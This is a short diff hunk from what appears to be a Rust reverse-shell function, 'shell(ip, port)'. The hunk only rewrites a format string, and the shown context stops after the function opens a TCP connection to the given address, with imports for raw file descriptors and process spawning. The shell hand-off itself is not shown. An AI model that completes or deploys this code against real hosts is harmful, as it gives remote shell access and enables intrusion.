@@ -3,7 +3,7 @@ use std::os::unix::io::{AsRawFd, FromRawFd};
 use std::process::{Command, Stdio};
 
 pub fn shell(ip: &str, port: u16) {
-    let ip_port = format!("{}:{}", ip, port);
+    let ip_port = format!("{ip}:{port}");
 
     // Make a TCP stream connection
     let stream = TcpStream::connect(ip_port).unwrap();
